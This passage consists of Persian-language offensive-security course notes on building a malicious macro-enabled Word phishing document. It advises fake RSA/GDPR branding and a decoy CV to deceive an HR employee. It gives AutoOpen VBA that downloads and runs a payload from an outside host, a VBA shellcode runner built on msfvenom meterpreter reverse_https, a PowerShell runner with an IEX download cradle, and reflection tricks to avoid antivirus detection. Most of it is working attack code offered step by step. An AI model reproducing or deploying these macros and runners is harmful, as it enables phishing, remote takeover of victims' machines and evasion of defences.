2. **ظاهر حرفه‌ای:** سند باید تمیز، بدون اشتباه و قانونی به نظر برسد
3. **اعتمادسازی:** استفاده از لوگوها، نام‌های برند و اصطلاحات فنی
4. **دستورالعمل واضح:** راهنمایی قربانی برای فعال کردن ماکروها
5. **کاهش شک:** محتوای سند باید پس از فعال‌سازی منطقی به نظر برسد

![[Pasted image 20260424161008.png]]

# بهبود قانونی بودن ظاهری سند

## افزودن لوگوی RSA

برای افزایش اعتبار و قانونی جلوه دادن سند، می‌توانیم **لوگوی RSA** را در هدر اضافه کنیم، همان‌طور که در **شکل 17** نشان داده شده است.

### چرا لوگوی RSA؟

- **RSA** یک نام شناخته شده در حوزه رمزنگاری و امنیت است
- کاربران به برندهای امنیتی معتبر اعتماد دارند
- لوگو به سند ظاهری حرفه‌ای و رسمی می‌دهد
- تقویت ادعای "رمزگذاری شده بودن" سند

### نکات پیاده‌سازی:

1. لوگوی RSA را در بالای سند (header) قرار دهید
2. در کنار متن GDPR compliance استفاده کنید
3. اطمینان حاصل کنید که لوگو با کیفیت و واضح باشد
4. ترکیب لوگو با متن فنی، اعتبار بیشتری ایجاد می‌کند

---

این تکنیک باعث می‌شود قربانی احساس کند که سند واقعاً توسط یک سیستم امنیتی حرفه‌ای محافظت شده است.

![[Pasted image 20260424161128.png]]


# تکنیک "جابجایی قدیمی" (The Old Switcheroo)

## حفظ ظاهر برای جلوگیری از هشدار به قربانی

### سناریوی مثال:

- **قربانی:** کارمند بخش منابع انسانی (Human Resources)
- **سازمان هدف:** یک موقعیت شغلی برای تحلیلگر منابع انسانی (HR Analyst) باز کرده است
- **Pretext ما:** سند متمرکز بر این زمینه خواهد بود

**نکته کلیدی:** باید ظاهر را حفظ کنیم تا قربانی را هشدار ندهیم.

---

## مکانیزم "The Old Switcheroo"

### انتظارات قربانی:

وقتی قربانی محتوا را فعال می‌کند (`Enable Content`):
- انتظار دارد محتوای "رمزگشایی شده" را ببیند
- در این مورد: یک **رزومه** (Resume)

### اهداف ما:

1. **نمایش محتوای مرتبط و مورد انتظار**
2. **نگه داشتن سند باز** تا زمانی که reverse shell متصل شود
3. **ادامه فریب** با ارائه محتوای واقع‌گرایانه

---

## توسعه محتوای "رمزگشایی شده"

### مراحل پیاده‌سازی:

#### مرحله 1: آماده‌سازی سند
1. یک کپی از سند Word ایجاد کنید
2. محتوای متنی موجود را حذف کنید
3. محتوای "رمزگشایی شده" را آماده کنید


#### مرحله 2: ایجاد محتوای مرتبط

محتوا باید **بر اساس pretext** متفاوت باشد:

**در مورد ما (هدف HR):**
- یک رزومه جذاب و واقع‌گرایانه
- مطالب مرتبط با منابع انسانی
- اطلاعات شغلی معتبر

#### مرحله 3: درج محتوا

محتوای "رمزگشایی شده" زمانی نمایش داده می‌شود که:
- کاربر ماکروها را فعال کند
- این محتوا شامل یک **CV ساده و جعلی** است (همان‌طور که در **شکل 18** نشان داده شده)

---

## نکات کلیدی برای موفقیت

### محتوای مرتبط:
- رزومه باید واقع‌گرایانه و حرفه‌ای باشد
- اطلاعات باید با موقعیت شغلی اعلام شده مطابقت داشته باشد
- از اشتباهات املایی و گرامری اجتناب کنید

### زمان‌بندی:
- محتوا باید به اندازه کافی جالب باشد که قربانی سند را باز نگه دارد
- این زمان برای اتصال reverse shell حیاتی است

### فریب مستمر:
- قربانی نباید احساس کند که چیزی اشتباه است
- محتوای نمایش داده شده باید انتظارات او را برآورده کند

---

## خلاصه استراتژی

[سند اولیه] → [فعال‌سازی ماکرو] → [نمایش CV جعلی] + [اجرای Payload]
     ↓                    ↓                      ↓
  رمزگذاری شده      قربانی فریب خورد        فریب ادامه می‌یابد


**هدف نهایی:** قربانی باید فکر کند همه چیز طبیعی است، در حالی که payload ما در پس‌زمینه اجرا می‌شود.

![[Pasted image 20260424161559.png]]
## ذخیره محتوای جعلی به عنوان AutoText

### مراحل ذخیره‌سازی:

#### مرحله 1: انتخاب متن
1. متن ایجاد شده (CV جعلی) را انتخاب کنید (Mark)
2. تمام محتوای مورد نظر را هایلایت کنید


#### مرحله 2: دسترسی به منوی AutoText
Insert > Quick Parts > AutoText > Save Selection to AutoText Gallery


#### مرحله 3: ذخیره
محتوای انتخاب شده به عنوان یک AutoText ذخیره می‌شود


---

## کاربرد AutoText در حمله

### چرا از AutoText استفاده می‌کنیم؟

- **جایگزینی خودکار محتوا:** پس از اجرای ماکرو، محتوای اولیه (متن رمزگذاری شده) با محتوای جعلی (CV) جایگزین می‌شود
- **ظاهر طبیعی:** قربانی فکر می‌کند سند واقعاً "رمزگشایی" شده است
- **کنترل از طریق VBA:** می‌توانیم با کد VBA این AutoText را فراخوانی کنیم

---

## نکته کلیدی

این تکنیک به ما اجازه می‌دهد:
- محتوای سند را **به صورت پویا** تغییر دهیم
- فریب را **پس از فعال‌سازی ماکرو** ادامه دهیم
- قربانی را در حالت **امن کاذب** نگه داریم

![[Pasted image 20260424161743.png]]

## ایجاد Building Block با نام "TheDoc"

### مراحل تکمیل دیالوگ:

#### پارامترهای دیالوگ Create New Building Block:

Name: TheDoc
Gallery: AutoText
Category: General
Description: (اختیاری - می‌توان خالی گذاشت)
Save in: (معمولاً سند فعلی یا Normal.dotm)
Options: Insert content only


---

## استفاده از Building Block در VBA

### فراخوانی AutoText از طریق کد:

```vba
Sub AutoOpen()
    ' حذف محتوای فعلی سند
    ActiveDocument.Content.Delete
    
    ' درج Building Block با نام "TheDoc"
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert _
        Where:=Selection.Range, RichText:=True
End Sub
```

---

## جریان کامل حمله:

### مرحله 1: قربانی سند را باز می‌کند
محتوا: متن "رمزگذاری شده" + هشدار امنیتی


### مرحله 2: قربانی "Enable Content" را می‌زند
ماکرو اجرا می‌شود → AutoOpen() فراخوانی می‌شود


### مرحله 3: جایگزینی محتوا
محتوای قدیمی حذف می‌شود
Building Block "TheDoc" (CV جعلی) درج می‌شود


### مرحله 4: اجرای Payload
در پس‌زمینه: دانلود و اجرای Meterpreter
در پیش‌زمینه: نمایش CV جعلی به قربانی


---

## نکات کلیدی:

- **نام Building Block** باید دقیقاً با نام استفاده شده در کد VBA مطابقت داشته باشد
- **Insert content only** تضمین می‌کند فقط محتوا درج شود، نه فرمت‌بندی اضافی
- این تکنیک **سوءظن را به حداقل می‌رساند** چون قربانی محتوای "رمزگشایی شده" را می‌بیند
![[Pasted image 20260424161845.png]]


# جایگزینی محتوا با AutoText - مراحل عملی

## مرور کلی

حالا که AutoText رو ذخیره کردید، باید:
1. محتوای CV جعلی رو از متن اصلی سند حذف کنید
2. متن "رمزگذاری شده" رو جایگزین کنید
3. ماکرو رو ویرایش کنید تا جایگزینی خودکار انجام بشه

---

## مرحله 1: آماده‌سازی سند اصلی

### حذف CV از متن اصلی:
1. CV جعلی که ساختید رو از سند حذف کنید
2. فقط متن "رمزگذاری شده" باید باقی بمونه:
   - متن base64 تصادفی
   - پیام GDPR Compliance
   - لوگوی RSA (اختیاری)


---

## مرحله 2: ویرایش ماکرو VBA

### ساختار نهایی ماکرو:

```vba
Sub Document_Open()
    SubstitutePage
End Sub

Sub AutoOpen()
    SubstitutePage
End Sub

Sub SubstitutePage()
    ' 1️⃣ انتخاب تمام محتوای سند
    ActiveDocument.Content.Select
    
    ' 2️⃣ حذف محتوای فعلی (متن رمزگذاری شده)
    Selection.Delete
    
    ' 3️⃣ درج CV جعلی از AutoText
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert _
        Where:=Selection.Range, RichText:=True
End Sub
```

---

## توضیح کد خط به خط

### بخش 1: تضمین اجرای خودکار
```vba
Sub Document_Open()
    SubstitutePage
End Sub

Sub AutoOpen()
    SubstitutePage
End Sub
```
**هدف:** اطمینان از اجرای ماکرو با هر دو روش (Document_Open و AutoOpen)

---

### بخش 2: انتخاب محتوا
```vba
ActiveDocument.Content.Select
```
**عملکرد:**
- `ActiveDocument.Content` → یک Range object برمی‌گردونه که کل محتوای سند رو نشون میده
- `.Select` → تمام محتوا رو انتخاب می‌کنه (مثل Ctrl+A)

---

### بخش 3: حذف محتوا
```vba
Selection.Delete
```
**عملکرد:**
- محتوای انتخاب شده (متن رمزگذاری شده) رو حذف می‌کنه
- سند خالی میشه

---

### بخش 4: درج AutoText
```vba
ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert _
    Where:=Selection.Range, RichText:=True
```

**تشریح:**
- `ActiveDocument.AttachedTemplate` → دسترسی به template سند
- `.AutoTextEntries("TheDoc")` → انتخاب AutoText با نام "TheDoc"
- `.Insert` → درج محتوا
  - `Where:=Selection.Range` → مکان درج (جایگاه فعلی cursor)
  - `RichText:=True` → حفظ فرمت‌بندی (فونت، رنگ، و غیره)

---

## جریان اجرا (قبل و بعد)

### قبل از Enable Content:
┌─────────────────────────────────────┐
│ 🔒 GDPR Compliance Notice           │
│                                     │
│ aGVsbG8gd29ybGQgdGhpcyBpcyBiYXNl... │
│ dGhpcyBpcyBhIGZha2UgZW5jcnlwdGVk... │
│                                     │
│ This document has been encrypted    │
│ in accordance with GDPR...          │
│                                     │
│ Please enable macros to decrypt...  │
└─────────────────────────────────────┘


### بعد از Enable Content:
┌─────────────────────────────────────┐
│ 📄 CURRICULUM VITAE                 │
│                                     │
│ John Smith                          │
│ Email: john.smith@email.com         │
│                                     │
│ PROFESSIONAL EXPERIENCE             │
│ HR Analyst | ABC Corp | 2018-2023   │
│ - Managed recruitment processes     │
│ - Conducted employee training       │
│                                     │
│ EDUCATION                           │
│ MBA in Human Resources              │
└─────────────────────────────────────┘


---

## ماکروی کامل با Payload

اگر می‌خواید payload هم اضافه کنید:

```vba
Sub Document_Open()
    SubstitutePage
    ExecutePayload
End Sub

Sub AutoOpen()
    SubstitutePage
    ExecutePayload
End Sub

Sub SubstitutePage()
    ' جایگزینی محتوا
    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert _
        Where:=Selection.Range, RichText:=True
End Sub

Sub ExecutePayload()
    ' دانلود payload
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.100/payload.exe','payload.exe')"
    Shell str, vbHide
    
    ' صبر برای دانلود
    Wait (2)
    
    ' اجرای payload
    Dim exePath As String
    exePath = ActiveDocument.Path + "\payload.exe"
    Shell exePath, vbHide
End Sub

Function Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Function
```

---

## نکات مهم

### ✅ چک‌لیست نهایی:
- [ ] AutoText با نام "TheDoc" ذخیره شده
- [ ] سند اصلی فقط متن رمزگذاری شده داره
- [ ] ماکرو شامل `SubstitutePage` هست
- [ ] سند با فرمت `.docm` یا `.doc` ذخیره شده

### ⚠️ خطاهای رایج:
- نام AutoText اشتباه (باید دقیقاً "TheDoc" باشه)
- فراموش کردن `RichText:=True` (فرمت‌بندی از بین میره)
- عدم ذخیره سند با فرمت Macro-Enabled

---

## تست نهایی

1. سند رو باز کنید
2. هشدار امنیتی رو ببینید
3. "Enable Content" بزنید
4. ✅ باید CV جعلی نمایش داده بشه
5. ✅ متن رمزگذاری شده باید ناپدید بشه


این تکنیک به شما اجازه میده یه حمله فیشینگ قانع‌کننده بسازید که قربانی رو فریب میده!


# VBA Shellcode Runner

این بخش نحوه ساخت یک **Shellcode Runner** در VBA را توضیح می‌دهد که shellcode را مستقیماً در حافظه اجرا می‌کند.

---

## رویکرد کلی

از سه Win32 API از `Kernel32.dll` استفاده می‌شود:

1. **`VirtualAlloc`**: تخصیص حافظه قابل نوشتن، خواندن و اجرا
2. **`RtlMoveMemory`**: کپی shellcode به حافظه تخصیص داده شده
3. **`CreateThread`**: ایجاد thread جدید برای اجرای shellcode

---

## 1. `VirtualAlloc` - تخصیص حافظه

### Function Prototype:
```c
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD flAllocationType,
  DWORD flProtect
);
```

### پارامترها:
- **`lpAddress`**: آدرس حافظه (اگر `0` باشد، API خودش انتخاب می‌کند)
- **`dwSize`**: اندازه تخصیص
- **`flAllocationType`**: نوع تخصیص
- **`flProtect`**: سطح حفاظت حافظه

### Declare در VBA:
```vba
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" _
  (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
   ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
```

---

## 2. تولید Shellcode

از `msfvenom` برای تولید shellcode با فرمت `vbapplication` استفاده می‌شود:

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 \
  EXITFUNC=thread -f vbapplication
```

### نکات:
- **معماری 32-bit**: چون Word 2016 به صورت پیش‌فرض 32-bit نصب می‌شود
- **`EXITFUNC=thread`**: جلوگیری از بسته شدن Word هنگام خروج shellcode

خروجی:
```vba
buf = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,...)
```

---

## 3. فراخوانی `VirtualAlloc`

```vba
Dim buf As Variant
Dim addr As LongPtr

buf = Array(232, 130, 0, 0, 0, 96, 137...)
addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
```

### مقادیر:
- **`lpAddress = 0`**: API خودش آدرس را انتخاب می‌کند
- **`dwSize = UBound(buf)`**: اندازه آرایه shellcode (محاسبه خودکار)
- **`flAllocationType = &H3000`**: `MEM_COMMIT | MEM_RESERVE`
- **`flProtect = &H40`**: حافظه قابل خواندن، نوشتن و اجرا (RWX)

---

## 4. `RtlMoveMemory` - کپی Shellcode

### Function Prototype:
```c
VOID RtlMoveMemory(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T Length
);
```

### Declare در VBA:
```vba
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" _
  (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
```

### کپی بایت به بایت:
```vba
Dim counter As Long
Dim data As Long

For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter
```

- **`LBound(buf)`**: اولین عنصر آرایه
- **`UBound(buf)`**: آخرین عنصر آرایه
- هر بایت به صورت جداگانه کپی می‌شود

---

## 5. `CreateThread` - اجرای Shellcode

### Function Prototype:
```c
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  SIZE_T dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID lpParameter,
  DWORD dwCreationFlags,
  LPDWORD lpThreadId
);
```

### Declare در VBA:
```vba
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" _
  (ByVal SecurityAttributes As Long, ByVal StackSize As Long, _
   ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, _
   ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
```

### فراخوانی:
```vba
res = CreateThread(0, 0, addr, 0, 0, 0)
```

- **`lpStartAddress = addr`**: آدرس شروع shellcode
- بقیه پارامترها `0` هستند

---

## کد کامل VBA

```vba
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" _
  (ByVal SecurityAttributes As Long, ByVal StackSize As Long, _
   ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, _
   ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" _
  (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
   ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" _
  (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, ...)
    
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

---

## مزایا و معایب

### مزایا:
- **اجرا در حافظه**: هیچ فایل اجرایی مخربی روی دیسک ذخیره نمی‌شود
- **Low-profile**: ردپای کمتری باقی می‌ماند

### معایب:
- **وابستگی به Word**: اگر قربانی Word را ببندد، shell از بین می‌رود
- راه حل: استفاده از `AutoMigrate` در Metasploit یا PowerShell (بخش بعدی)

---

## نکات مهم

- **Listener**: باید یک `multi/handler` 32-bit با `EXITFUNC=thread` و IP/Port مطابق در Metasploit اجرا شود
- **DEP**: `VirtualAlloc` تنها API است که می‌تواند حافظه قابل اجرا تخصیص دهد (به دلیل Data Execution Prevention)


## 3.5.1 Calling Win32 APIs from PowerShell


# PowerShell و Win32 APIs

PowerShell به صورت بومی نمی‌تواند با Win32 APIs تعامل کند، اما با استفاده از .NET Framework می‌توان از C# در PowerShell استفاده کرد.

---

## P/Invoke (Platform Invocation Services)

### مفهوم:
- **P/Invoke** امکان فراخوانی توابع Win32 API از کد مدیریت شده (.NET) را فراهم می‌کند
- از کلاس `DllImportAttribute` برای declare و import APIها استفاده می‌شود
- نیاز به ترجمه data types از C به C# دارد

### Namespaces مورد نیاز:
```csharp
using System;
using System.Runtime.InteropServices;
```

### منبع: **www.pinvoke.net**
- مرجع اصلی برای ترجمه Win32 APIs به C#
- شامل method signatures آماده

---

## مثال: MessageBox

### C Function Prototype:
```c
int MessageBox(
  HWND hWnd,
  LPCTSTR lpText,
  LPCTSTR lpCaption,
  UINT uType
);
```

### C# Method Signature:
```csharp
[DllImport("user32.dll", SetLastError = true, CharSet= CharSet.Auto)]
public static extern int MessageBox(int hWnd, String text, String caption, uint type);
```

---

## استفاده در PowerShell با Add-Type

### کد کامل:
```powershell
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text,
        String caption, int options);
}
"@

Add-Type $User32
[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```

### توضیحات:
- **`@"..."`**: Here-Strings برای تعریف بلوک‌های متنی چند خطی
- **`Add-Type`**: کامپایل کد C# و ساخت .NET object
- **`[User32]::MessageBox(...)`**: فراخوانی API از طریق .NET object

### نکته مهم:
- برای تست با Word 32-bit، از PowerShell ISE نسخه 32-bit استفاده کنید:
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe


---

## Shellcode Runner در PowerShell

### مراحل:
1. **`VirtualAlloc`**: تخصیص حافظه قابل اجرا
2. **`Marshal.Copy`**: کپی shellcode به حافظه (جایگزین `RtlMoveMemory`)
3. **`CreateThread`**: اجرای shellcode

### Import APIها:
```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
        uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $Kernel32
```

### تولید Shellcode:
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 \
  EXITFUNC=thread -f ps1
```

خروجی:
```powershell
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89...
```

### کد کامل Shellcode Runner:
```powershell
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...

$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)
```

---

## مشکل: خروج زودهنگام PowerShell

### علت:
- وقتی PowerShell process خاتمه می‌یابد، shell نیز terminate می‌شود
- Meterpreter فرصت اجرای کامل ندارد

### راه حل: `WaitForSingleObject`

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

# ... (کد قبلی)

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

### توضیحات:
- **`$thandle`**: handle برگشتی از `CreateThread`
- **`0xFFFFFFFF`**: انتظار بی‌نهایت (تا خروج shell)
- **`[uint32]`**: type cast صریح (PowerShell فقط signed integers دارد)

---

## ادغام با VBA: Download Cradle

```vba
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

### جریان حمله:
1. VBA ماکرو اجرا می‌شود
2. PowerShell cradle فایل `run.ps1` را از وب سرور دانلود می‌کند
3. `IEX` (Invoke-Expression) کد را در حافظه اجرا می‌کند
4. Shellcode runner اجرا شده و Meterpreter shell برقرار می‌شود

---

## Artifacts روی دیسک

### مشکل: Add-Type فایل می‌نویسد

وقتی `Add-Type` اجرا می‌شود:
1. **C# source code** (`.cs`) روی دیسک نوشته می‌شود
2. **csc.exe** (C# compiler) آن را کامپایل می‌کند
3. **Assembly** (`.dll`) ساخته و load می‌شود

### بررسی با Process Monitor:
- فیلتر: `Process Name is powershell_ise.exe` و `Operation is WriteFile`
- نتیجه: فایل‌هایی مانند `rtylilrr.0.cs` و `rtylilrr.dll` نوشته می‌شوند

### لیست Assemblies بارگذاری شده:
```powershell
[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
```

خروجی شامل:
rtylilrr, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null


### نتیجه:
- این artifacts توسط آنتی‌ویروس قابل شناسایی هستند
- نیاز به تکنیک جایگزین (Reflection) برای اجتنا از نوشتن روی دیسک

---

## خلاصه

PowerShell با استفاده از P/Invoke و Add-Type می‌تواند Win32 APIs را فراخوانی کند. این تکنیک برای ساخت shellcode runner قدرتمند است، اما artifacts روی دیسک می‌گذارد که باید با Reflection برطرف شود.


## 3.6.2 Leveraging UnsafeNativeMethods

# بهبود Shellcode Runner با Reflection

این بخش تکنیک **Dynamic Lookup** را معرفی می‌کند که به جای `Add-Type` (که روی دیسک می‌نویسد)، از Reflection برای فراخوانی Win32 APIs استفاده می‌کند.

---

## مشکل Add-Type

وقتی `Add-Type` اجرا می‌شود:
1. کد C# به فایل `.cs` نوشته می‌شود
2. کامپایلر `csc.exe` آن را کامپایل می‌کند
3. Assembly (`.dll`) ساخته و load می‌شود

**نتیجه:** Artifacts روی دیسک → قابل شناسایی توسط آنتی‌ویروس

---

## راه حل: Dynamic Lookup

### دو API کلیدی:
- **`GetModuleHandle`**: دریافت handle (آدرس پایه) یک DLL
- **`GetProcAddress`**: دریافت آدرس یک تابع خاص در DLL

### هدف:
فراخوانی این دو API **بدون استفاده از Add-Type**

---

## مرحله 1: جستجوی Assemblies موجود

```powershell
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$Assemblies | ForEach-Object {
    $_.GetTypes() | ForEach-Object {
        $_ | Get-Member -Static | Where-Object {
            $_.TypeName.Contains('Unsafe')
        }
    } 2> $null
}
```

### توضیحات:
- **`GetAssemblies()`**: لیست assemblies بارگذاری شده در PowerShell
- **`GetTypes()`**: دریافت تمام types (classes, structs) در هر assembly
- **`Get-Member -Static`**: فقط methodهای static
- **فیلتر `Unsafe`**: کد C# برای فراخوانی Win32 APIs باید از کلمه کلیدی `Unsafe` استفاده کند

---

## مرحله 2: یافتن Assembly مناسب

```powershell
$Assemblies | ForEach-Object {
    $_.Location
    $_.GetTypes() | ForEach-Object {
        $_ | Get-Member -Static | Where-Object {
            $_.TypeName.Equals('Microsoft.Win32.UnsafeNativeMethods')
        }
    } 2> $null
}
```

### نتیجه:
- **Assembly**: `System.dll`
- **Class**: `Microsoft.Win32.UnsafeNativeMethods`
- شامل `GetModuleHandle` و `GetProcAddress`

---

## مرحله 3: دریافت Reference با Reflection

```powershell
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
    $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')
})

$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
```

### فیلترها:
- **`GlobalAssemblyCache`**: فقط assemblies بومی ویندوز
- **`Location.Split('\\')[-1]`**: آخرین بخش مسیر = نام فایل

---

## مرحله 4: فراخوانی GetModuleHandle

```powershell
$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll"))
```

### خروجی:
1973485568  # معادل 0x75A10000


تأیید با Process Explorer → Load Address از `user32.dll`

---

## مرحله 5: فراخوانی GetProcAddress

### مشکل: Ambiguous Match
```powershell
$GetProcAddress = $unsafeObj.GetMethod('GetProcAddress')
# خطا: "Ambiguous match found"
```

**علت:** چند نسخه از `GetProcAddress` وجود دارد

### راه حل:
```powershell
$tmp = @()
$unsafeObj.GetMethods() | ForEach-Object {
    If($_.Name -eq "GetProcAddress") {$tmp += $_}
}
$GetProcAddress = $tmp[0]

$GetProcAddress.Invoke($null, @($user32, "MessageBoxA"))
```

### خروجی:
1974017664  # آدرس MessageBoxA


---

## تابع قابل استفاده مجدد: LookupFunc

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)
    
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And 
        $_.Location.Split('\\')[-1].Equals('System.dll') }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')
    
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If($_.Name -eq "GetProcAddress") {$tmp += $_}
    }
    
    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}

# استفاده:
$MessageBoxA = LookupFunc user32.dll MessageBoxA
```

---

## مرحله 6: ساخت Delegate Type با Reflection

### مشکل:
- آدرس تابع را داریم، اما نیاز به **function prototype** (تعداد و نوع آرگومان‌ها) داریم
- در C# از `delegate` استفاده می‌شود، اما PowerShell معادلی ندارد

### راه حل: ساخت دستی Assembly در حافظه

#### 1. ساخت Assembly:
```powershell
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly,
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
```

#### 2. ساخت Module:
```powershell
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
```

#### 3. ساخت Type:
```powershell
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType',
    'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
```

#### 4. تعریف Constructor:
```powershell
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
    'RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard,
    @([IntPtr], [String], [String], [int]))  # آرگومان‌های MessageBoxA

$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
```

#### 5. تعریف Invoke Method:
```powershell
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke',
    'Public, HideBySig, NewSlot, Virtual',
    [int],  # Return type
    @([IntPtr], [String], [String], [int]))  # آرگومان‌ها

$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
```

#### 6. ساخت نهایی:
```powershell
$MyDelegateType = $MyTypeBuilder.CreateType()
```

---

## کد کامل: فراخوانی MessageBox بدون Add-Type

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And 
        $_.Location.Split('\\')[-1].Equals('System.dll') }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')
    
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If($_.Name -eq "GetProcAddress") {$tmp += $_}
    }
    
    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}

$MessageBoxA = LookupFunc user32.dll MessageBoxA

$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly,
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType',
    'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])

$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
    'RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard,
